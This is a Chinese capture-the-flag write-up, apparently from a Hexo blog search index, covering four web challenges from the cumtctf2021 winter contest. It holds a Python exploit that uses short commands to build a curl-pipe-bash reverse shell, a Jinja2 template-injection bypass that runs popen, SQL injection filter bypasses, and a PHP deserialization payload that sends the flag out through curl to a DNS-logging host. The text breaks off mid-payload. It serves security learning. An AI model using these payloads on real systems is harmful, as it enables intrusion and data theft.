<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>cumtctf2021寒假赛web</title>
      <link href="/2021/02/06/cumtctf2021-han-jia-sai-web/"/>
      <url>/2021/02/06/cumtctf2021-han-jia-sai-web/</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="lt-4"><a href="#lt-4" class="headerlink" title="&lt;=4"></a>&lt;=4</h2><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token string">'/www/sandbox/'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">"ctf"</span> <span class="token punctuation">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'rce'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'rce'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    @<span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'rce'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'reset'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    @<span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">'/bin/rm -rf '</span> <span class="token punctuation">.</span> <span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>限制了命令的长度为&lt;=4，利用Linux中&gt;x会生成名为x的文件，ls -t &gt;a会将当前文件夹中的文件名按文件最新修改顺序导入到a中，再利用<code>\</code>连接符连接指令达到执行命令的目，如文件a</p><blockquote><p>cu\<br>rl\<br>\ <br>x.com;</p></blockquote><p><code>sh a</code>即执行curl x.com<br>exp:</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quotepayload <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token comment" spellcheck="true"># generate "g> ht- sl" to file "v"</span>    <span class="token string">'>dir'</span><span class="token punctuation">,</span>     <span class="token string">'>sl'</span><span class="token punctuation">,</span>     <span class="token string">'>g\>'</span><span class="token punctuation">,</span>    <span class="token string">'>ht-'</span><span class="token punctuation">,</span>    <span class="token string">'*>v'</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true"># reverse file "v" to file "x", content "ls -th >g"</span>    <span class="token string">'>rev'</span><span class="token punctuation">,</span>    <span class="token string">'*v>x'</span><span class="token punctuation">,</span>    <span class="token string">'>\;'</span><span class="token punctuation">,</span>    <span class="token string">'>sh\\'</span><span class="token punctuation">,</span>     <span class="token string">'\\\\'</span><span class="token punctuation">,</span>    <span class="token string">'>ba\\'</span><span class="token punctuation">,</span>     <span class="token string">'\\\\'</span><span class="token punctuation">,</span>    <span class="token string">'>\|\\'</span><span class="token punctuation">,</span>     <span class="token string">'\\\\'</span><span class="token punctuation">,</span>    <span class="token string">'>cc\\'</span><span class="token punctuation">,</span>    <span class="token string">'\\\\'</span><span class="token punctuation">,</span>    <span class="token string">'>e.\\'</span><span class="token punctuation">,</span>    <span class="token string">'\\\\'</span><span class="token punctuation">,</span>    <span class="token string">'>re\\'</span><span class="token punctuation">,</span>    <span class="token string">'\\\\'</span><span class="token punctuation">,</span>    <span class="token string">'>pf\\'</span><span class="token punctuation">,</span>    <span class="token string">'\\\\'</span><span class="token punctuation">,</span>    <span class="token string">'>ap\\'</span><span class="token punctuation">,</span>    <span class="token string">'\\\\'</span><span class="token punctuation">,</span>    <span class="token string">'>at\\'</span><span class="token punctuation">,</span>    <span class="token string">'\\\\'</span><span class="token punctuation">,</span>    <span class="token string">'>n\\'</span><span class="token punctuation">,</span>    <span class="token string">'\\\\'</span><span class="token punctuation">,</span>    <span class="token string">'>6.\\'</span><span class="token punctuation">,</span>    <span class="token string">'\\\\'</span><span class="token punctuation">,</span>    <span class="token string">'>i\\'</span><span class="token punctuation">,</span>    <span class="token string">'\\\\'</span><span class="token punctuation">,</span>    <span class="token string">'>8r\\'</span><span class="token punctuation">,</span>    <span class="token string">'\\\\'</span><span class="token punctuation">,</span>    <span class="token string">'>p8\\'</span><span class="token punctuation">,</span>    <span class="token string">'\\\\'</span><span class="token punctuation">,</span>    <span class="token string">'>\ \\'</span><span class="token punctuation">,</span>     <span class="token string">'\\\\'</span><span class="token punctuation">,</span>    <span class="token string">'>rl\\'</span><span class="token punctuation">,</span>     <span class="token string">'\\\\'</span><span class="token punctuation">,</span>    <span class="token string">'>cu\\'</span><span class="token punctuation">,</span>     <span class="token comment" spellcheck="true"># got shell</span>    <span class="token string">'sh x'</span><span class="token punctuation">,</span>     <span class="token string">'sh g'</span><span class="token punctuation">,</span> <span class="token punctuation">]</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://219.219.61.234:50051/?reset=1'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> payload<span class="token punctuation">:</span>    <span class="token keyword">assert</span> len<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">4</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://219.219.61.234:50051/?rce='</span> <span class="token operator">+</span> i<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span></code></pre><p>反弹shell<br><img src="https://img-blog.csdnimg.cn/20210131215659672.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21ldGVveA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>可参考链接：</p><h2 id="无情的hello机器"><a href="#无情的hello机器" class="headerlink" title="无情的hello机器"></a>无情的hello机器</h2>ssti，`{%print(7*7)%}`，得到49    <p>初期测试过滤了[]，’，”，这题貌似用不了编码绕过，用了就500，搞得我所有payload都500，以为环境有问题就没搞了，放了wp才发现是编码的问题。</p><p>wp放出源码</p><pre class=" language-python"><code class="language-python">blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'\''</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">'['</span><span class="token punctuation">,</span> <span class="token string">']'</span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">,</span> <span class="token string">'{{'</span><span class="token punctuation">,</span> <span class="token string">'args'</span><span class="token punctuation">,</span> <span class="token string">'values'</span><span class="token punctuation">]</span></code></pre><p><a href="https://www.freebuf.com/articles/network/258136.html" target="_blank" rel="noopener">建议学习链接</a>里面对jinja2的过滤讲解很全面</p><p>最终payload    </p>{% raw %}>`http://219.219.61.234:50050/?name={%print((()|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c)()|attr(request.cookies.d)(132)|attr(request.cookies.e)|attr(request.cookies.f)|attr(request.cookies.d)(request.cookies.g))(request.cookies.h).read())%}Cookie: h=catf*;a=__class__;b=__base__;c=__subclasses__;d=__getitem__;e=__init__;f=__globals__;g=popen`{% endraw %}<h2 id="EZSQLI"><a href="#EZSQLI" class="headerlink" title="EZSQLI"></a>EZSQLI</h2><p>这题写的心态蹦了，fuzzing实在是太磨人了，自闭</p><p>页面只有一个注册页面和一个登录页面，数据库限制了用户名插入的长度，并且对用户名进行了mysql_real_escape_string，思路类似于过滤单引号的注入，直接注册123\\\\（打很多\，数据库会自动截断30字符）</p><p>这样登录时\会将后面的<code>&#39;</code>注释掉，最终password就逃逸了出来，就比如，username=’123\\\‘and password=’union select 1,2,3#’。</p><p>并且登录还对password进行了单次过滤</p><pre><code>$list=array(&quot; &quot;,&quot;or&quot;,&quot;select&quot;,&quot;and&quot;,&quot;union&quot;);$passowrd=str_ireplace($list,&quot;&quot;,$passowrd);</code></pre><p>但登录界面就登录成功和密码错误两种状态，fuzz起来属实恶心，知道源码后直接双写绕过就行</p><p>查显示点</p><pre><code>username=1233\\\\\\\\\\\\\\\\\\\\\\\\\\\password=uniunionon/**/seleselectct/**/1,2,3;</code></pre><pre><code>hello,your password is 3</code></pre><p>查flag</p><pre><code>uniunionon/**/seleselectct/**/1,2,flag/**/from/**/flag;#</code></pre><p>但提示不在这</p><p>查其它数据库</p><pre><code>uniunionon/**/seleselectct/**/1,2,group_concat(SCHEMA_NAME)/**/from/**/infoorrmation_schema.SCHEMATA;</code></pre><p>得到This_true数据库</p><p>最终</p><pre><code>uniunionon/**/seleselectct/**/1,2,flag/**/from/**/This_true.flag;#</code></pre><h2 id="ez-php"><a href="#ez-php" class="headerlink" title="ez_php"></a>ez_php</h2><p><a href="http://www.zip下载源代码,反序列化题目,开始以为要注入得到admin密码,原来admin查询的表就是注册的表,直接用注册的账户登录就行/" target="_blank" rel="noopener">www.zip下载源代码，反序列化题目，开始以为要注入得到admin密码，原来admin查询的表就是注册的表，直接用注册的账户登录就行</a></p><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//do.php</span>    <span class="token delimiter">&lt;?php</span>    <span class="token keyword">include</span> <span class="token string">'./config/global.php'</span><span class="token punctuation">;</span>    <span class="token variable">$command</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'command'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$command</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">case</span> <span class="token string">'register'</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password_1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">safe</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$email</span> <span class="token operator">=</span> <span class="token function">safe</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$password_1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password_1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$sql1</span> <span class="token operator">=</span> <span class="token string">"select count(id) from prosscss where username='$username'"</span><span class="token punctuation">;</span>            <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span><span class="token variable">$sql1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token string">'count(id)'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"&lt;script language=\"JavaScript\"> alert('该昵称已被注册!');window.history.back(-1); &lt;/script> "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token operator">==</span> <span class="token variable">$password_1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"insert into prosscss(username,password,email) values('$username','$password','$email')"</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">echo</span> <span class="token string">"&lt;script language=\"JavaScript\"> alert('注册成功');self.location='./login.php'; &lt;/script> "</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                    <span class="token keyword">echo</span> <span class="token string">"&lt;script language=\"JavaScript\"> alert('注册失败!');window.history.back(-1); &lt;/script> "</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"&lt;script language=\"JavaScript\"> alert('请将信息填写完整!');window.history.back(-1); &lt;/script> "</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>            <span class="token shell-comment comment"># code...</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'login'</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">safe</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select * from prosscss where username='{$username}' and password='{$password}'"</span><span class="token punctuation">;</span>                <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token keyword">echo</span> <span class="token string">"&lt;script language=\"JavaScript\"> alert('用户名或密码错误，请重新登录!');window.history.back(-1); &lt;/script> "</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                    <span class="token variable">$sql2</span> <span class="token operator">=</span> <span class="token string">"select * from prosscss where username like '$username'"</span><span class="token punctuation">;</span>                    <span class="token variable">$re</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span><span class="token variable">$sql2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token variable">$row</span> <span class="token operator">=</span><span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                    <span class="token keyword">echo</span> <span class="token string">"&lt;script language=\"JavaScript\"> alert('登录成功');self.location='./index.php'; &lt;/script> "</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">" "</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'modify_email'</span><span class="token punctuation">:</span>            <span class="token shell-comment comment"># code...</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'modify'</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'email_id'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">"&lt;script language=\"JavaScript\"> alert('请先验证邮箱!');self.location='./modify.php'; &lt;/script> "</span><span class="token punctuation">;</span>              <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password_1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password_1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">echo</span> <span class="token string">"&lt;script language=\"JavaScript\"> alert('两次输入的密码不一致,请重新填写。');self.location='./modify.php'; &lt;/script> "</span><span class="token punctuation">;</span>                    exit<span class="token punctuation">;</span>                  <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'tmp_username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                    <span class="token variable">$update</span> <span class="token operator">=</span> <span class="token string">"update prosscss set password='$password' where username='$username'"</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span><span class="token variable">$update</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                      <span class="token keyword">echo</span> <span class="token string">"&lt;script language=\"JavaScript\"> alert('重置成功');self.location='./index.php'; &lt;/script> "</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>                      <span class="token keyword">echo</span> <span class="token string">"&lt;script language=\"JavaScript\"> alert('不知道为什么重置失败,请重新重置密码.');self.location='./modify.php'; &lt;/script> "</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                  <span class="token punctuation">}</span>                <span class="token punctuation">}</span>              <span class="token punctuation">}</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'mess'</span><span class="token punctuation">:</span>            <span class="token variable">$mess</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">safe</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">safe</span><span class="token punctuation">(</span><span class="token variable">$mess</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$insert</span> <span class="token operator">=</span> <span class="token string">"insert into mess(username,content) values('$username','$content')"</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span><span class="token variable">$insert</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">"&lt;script language=\"JavaScript\"> alert('留言成功');self.location='./yes.php'; &lt;/script> "</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">"&lt;script language=\"JavaScript\"> alert('留言失败');self.location='./yes.php'; &lt;/script> "</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token shell-comment comment"># code...</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'logout'</span><span class="token punctuation">:</span>            <span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'email_id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string">"&lt;script>location.href='./index.html'&lt;/script>"</span><span class="token punctuation">;</span>            <span class="token shell-comment comment"># code...</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">default</span><span class="token punctuation">:</span>            <span class="token shell-comment comment"># code...</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token delimiter">?></span></code></pre><p>反序列化的点在登录处，留言后管理员登录，会反序列化数据库中留言的值</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>                                <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_all</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token keyword">as</span> <span class="token variable">$key1</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$value1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                        <span class="token variable">$arr</span> <span class="token operator">=</span> @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$value1</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                            <span class="token keyword">echo</span> <span class="token string">"&lt;pre>"</span><span class="token punctuation">;</span>                                            <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                            <span class="token keyword">echo</span> <span class="token string">"&lt;/pre>"</span><span class="token punctuation">;</span>                                            <span class="token keyword">echo</span> <span class="token string">"&lt;tr>"</span><span class="token punctuation">;</span>                                            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$arr</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                                <span class="token keyword">echo</span> <span class="token string">"&lt;td>"</span> <span class="token punctuation">.</span> <span class="token variable">$value</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/td>"</span><span class="token punctuation">;</span>                                            <span class="token punctuation">}</span>                                            <span class="token keyword">echo</span> <span class="token string">"&lt;/tr>"</span><span class="token punctuation">;</span>                                        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                            <span class="token keyword">echo</span> <span class="token string">"留言内容不健康..."</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//                                        exit;</span>                                        <span class="token punctuation">}</span>                                    <span class="token punctuation">}</span>                                <span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>function中有autoload魔术函数</p><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">__autoload</span><span class="token punctuation">(</span><span class="token variable">$classname</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">require</span> <span class="token constant">PATH</span> <span class="token punctuation">.</span> <span class="token string">"class_"</span><span class="token punctuation">.</span><span class="token variable">$classname</span><span class="token punctuation">.</span><span class="token string">".php"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>可自动包含生成对象的类文件</p><p>class__test.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">test</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>由于最初序列化的是整个$_POST数组，前面会有个序列化数组的格式，直接输入，我们的payload会储存在数组中，反序列化后也只是数组中的字符串值，所以我们要进行闭合，闭合的是insert语句</p><p>payload</p><pre><code>&#39;),(&#39;test&#39;,&#39;O:4:&quot;test&quot;:1:{s:4:&quot;test&quot;;s:40:&quot;curl `cat/flag|base64`.069kqq.dnslog.cn&quot;;}&#39;)-- </code></pre><p><code>&#39;)</code>闭合了前面的语句，是前面的用户留言为之前的数组语句，<code>(&#39;test&#39;,&#39;O:4:&quot;test&quot;:1:{s:4:&quot;test&quot;;s:40:&quot;curl </code>cat/flag|base64<code>.069kqq.dnslog.cn&quot;;}&#39;)</code>，此语句插入的为用户test的留言，内容为<code>O:4:&quot;test&quot;:1:{s:4:&quot;test&quot;;s:40:&quot;curl 